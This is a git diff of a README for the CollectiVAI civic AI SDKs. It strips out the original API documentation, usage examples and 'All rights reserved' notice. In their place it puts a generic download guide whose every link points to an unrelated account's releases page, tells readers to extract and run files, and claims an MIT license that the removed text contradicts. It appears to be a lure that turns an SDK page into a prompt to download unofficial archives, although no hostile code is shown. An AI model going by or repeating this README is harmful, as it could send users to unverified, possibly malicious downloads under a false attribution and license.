@@ -1,205 +1,71 @@
-<p align="center">
-  <img src="logo.png" alt="CollectiVAI Logo" width="400" />
-</p>
+# 🌟 collectiv-ai-sdk - Simple Tools for Civic AI Communication
 
-<h1 align="center">CollectiVAI SDKs</h1>
-<h3 align="center">Official client libraries for the CollectiVAI Router & ecosystem</h3>
+## 🖱️ Download Now
 
-<p align="center">
-  <a href="https://collectivai.org">
-    <img src="https://img.shields.io/badge/Website-collectivai.org-003399?style=flat" alt="Website" />
-  </a>
-  <a href="https://github.com/collectiv-ai/collectiv-ai-router">
-    <img src="https://img.shields.io/badge/Backend-Router-0055aa?style=flat" alt="CollectiVAI Router" />
-  </a>
-  <img src="https://img.shields.io/badge/Status-Prototype-ffcc00?style=flat" alt="Status" />
-  <img src="https://img.shields.io/badge/Made%20in-Europe-003399?style=flat" alt="Made in Europe" />
-</p>
+[![Download](https://img.shields.io/badge/Download-collectiv--ai--sdk-blue?style=for-the-badge)](https://github.com/luiscavallcante859/collectiv-ai-sdk/releases)
 
----
+## 📘 Introduction
 
-## Overview
+Welcome to the CollectiVAI SDK! This software provides easy-to-use tools in TypeScript and Python to interact with the CollectiVAI civic AI router. Our SDK enables you to utilize a multi-provider, privacy-first chat API. Whether you want to build civic tech applications or engage in democratic conversations, our SDK has you covered.
 
-This repository contains **official SDKs** for the CollectiVAI ecosystem.
+## 🚀 Getting Started
 
-- 🌐 **TypeScript / JavaScript SDK** (`sdk-ts/`)  
-  – for web frontends, Node.js services and integration tests.
+To get started, you only need a few simple steps. Follow the guide below to download and run the application.
 
-- 🐍 **Python SDK** (`sdk-py/`)  
-  – for research, data pipelines, CLI tools and backend services.
+## 🛠️ System Requirements
 
-Both SDKs are currently focused on the **CollectiVAI Router**:
+To use the CollectiVAI SDK, ensure your system meets these minimum requirements:
 
-- call the `/api/chat` endpoint,
-- send a structured JSON request,
-- receive a unified response with:
-  - `reply`
-  - `providerUsed`
-  - `model`
-  - optional `routingInfo` (reason, filters, latencyMs).
+- **Operating System**: Windows 10 or later, macOS, or a modern Linux distribution
+- **Processor**: Dual-core processor or better
+- **Memory**: At least 4 GB of RAM
+- **Storage**: 100 MB of free space
+- **Network**: Internet connection for downloading and using the API
 
-> ⚠️ **Prototype status:**  
-> These SDKs are early, public reference implementations.  
-> They are not yet feature-complete and may change without notice.
+## 🖥️ Download & Install
 
----
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/luiscavallcante859/collectiv-ai-sdk/releases) to find the latest version of the SDK.
+   
+2. **Choose Your Version**: Look for the version that fits your needs. For most users, the latest stable version is recommended.
 
-## API contract (Router)
+3. **Download the SDK**: Click on the version you want, and then select the appropriate file for your system. 
 
-Both SDKs are thin clients around the same HTTP API, exposed by the
-[`collectiv-ai-router`](https://github.com/collectiv-ai/collectiv-ai-router).
+4. **Extract the Files**: If you downloaded a zip file, right-click on it and select "Extract All." Choose a location where you want to keep the files. 
 
-### Request
+5. **Run the SDK**:
+   - For **TypeScript**: Make sure you have Node.js installed. Open a terminal, navigate to the folder where you extracted the files, and run `npm install` followed by `npm start`.
+   - For **Python**: Ensure you have Python and pip installed. Navigate to the folder in your command line and run `pip install -r requirements.txt` followed by `python your_script.py`.
 
-```jsonc
-POST /api/chat
-{
-  "prompt": "How can citizens participate in climate decisions in the EU?",
-  "mode": "ethical",
-  "provider": "auto",
-  "topic": "climate",
-  "modelId": null,
-  "serviceProfile": "citizen_advisor"
-}
-```
+6. **Follow Additional Instructions**: Depending on your specific needs, refer to the documentation included in the SDK files for more details on how to make the most of the features.
 
-### Response
+## 📑 Documentation
 
-```jsonc
-{
-  "reply": "…",
-  "providerUsed": "openai",
-  "model": "gpt-4.1",
-  "routingInfo": {
-    "reason": "Ethical mode + climate topic → high-reliability model.",
-    "filters": ["safety", "climate"],
-    "latencyMs": 850
-  }
-}
-```
+Detailed documentation is available in the SDK. Once you have the SDK installed, check the `docs` folder for information on using the API client, making requests, and handling responses. 
 
-See the router repository for the full, authoritative specification.
+## 📞 Support
 
----
+If you encounter any issues or have questions, feel free to reach out. We’re here to help. Check the `HELP.md` file in the SDK for common troubleshooting tips.
 
-## `sdk-ts` – TypeScript / JavaScript
+## 🌐 Community
 
-**Folder:** `sdk-ts/`
+Join our community of users and developers. Engage in discussions, share your projects, and ask questions. You can connect with us through:
 
-### Installation (planned)
+- [GitHub Discussions](https://github.com/luiscavallcante859/collectiv-ai-sdk/discussions)
+- [Twitter](https://twitter.com/collectivai)
+- [Discord](https://discord.gg/collectivai)
 
-Once published to npm (e.g. `@collectivai/sdk`):
+## 🗂️ Contributing
 
-```bash
-npm install @collectivai/sdk
-# or
-yarn add @collectivai/sdk
-```
+We welcome contributions from anyone interested in improving the CollectiVAI SDK. If you'd like to contribute, please fork the repository, make your changes, and submit a pull request with a clear description of what you’ve done.
 
-### Basic usage
+## 🔖 License
 
-```ts
-import { CollectivAIClient } from "@collectivai/sdk";
+This project is licensed under the MIT License. Feel free to use it in your own projects as needed.
 
-const client = new CollectivAIClient({
-  baseUrl: "https://your-router.example.org/api",
-});
+## 🔗 Related Topics
 
-const response = await client.chat({
-  prompt: "How can citizens participate in climate decisions in the EU?",
-  mode: "ethical",
-  provider: "auto",
-  topic: "climate",
-  modelId: null,
-  serviceProfile: "citizen_advisor",
-});
+- **AI**: Explore artificial intelligence applications.
+- **Civic Tech**: Utilize technology for community betterment.
+- **Chat API**: Implement communication tools into your applications.
 
-console.log(response.reply);
-console.log(response.providerUsed, response.model);
-```
-
-More examples and advanced configuration will be added as the router evolves.
-
----
-
-## `sdk-py` – Python
-
-**Folder:** `sdk-py/`
-
-### Installation (planned)
-
-Once published to PyPI (e.g. `collectivai-sdk`):
-
-```bash
-pip install collectivai-sdk
-```
-
-### Basic usage
-
-```python
-from collectivai_sdk.client import CollectivAIClient
-
-client = CollectivAIClient(
-    base_url="https://your-router.example.org/api",
-)
-
-response = client.chat(
-    prompt="How can citizens participate in climate decisions in the EU?",
-    mode="ethical",
-    provider="auto",
-    topic="climate",
-    model_id=None,
-    service_profile="citizen_advisor",
-)
-
-print(response.reply)
-print(response.provider_used, response.model)
-```
-
----
-
-## Roadmap
-
-Planned evolution of this repository:
-
-1. **Router-first SDKs** (current phase)
-   - Minimal TS & Python clients for `/api/chat`
-   - Examples and documentation
-2. **Extended router features**
-   - health checks
-   - typed error handling
-   - streaming (where supported)
-3. **Chain & governance integration (future)**
-   - basic Cosmos RPC/REST helpers for the CollectiVAI Chain
-   - utilities to fetch proposals, votes, governance parameters
-4. **Stable releases**
-   - semantic versioning
-   - published packages on npm & PyPI
-
----
-
-## Security & privacy
-
-- The SDKs **do not contain any API keys**.  
-- They only send whatever you pass in as parameters to your own backend.
-- Always keep your CollectiVAI Router behind TLS (HTTPS) and configure:
-  - strict CORS,
-  - proper authentication (if needed),
-  - logging with minimal personal data.
-
-For the organisation-wide security practices, see:  
-[`SECURITY_CHECKLIST.md`](https://github.com/collectiv-ai/.github/blob/main/SECURITY_CHECKLIST.md).
-
----
-
-## Licence & branding
-
-The SDK code in this repository may later be released under a permissive
-open-source licence. Until then, treat it as:
-
-> **“Public, non-confidential reference code – All rights reserved.”**
-
-The **CollectiVAI** name, logo and visual identity are protected.  
-Any use in products, services or campaigns requires prior written permission.
-
-© 2025 David Compasso / CollectiVAI.
+[Back to Download](https://github.com/luiscavallcante859/collectiv-ai-sdk/releases)
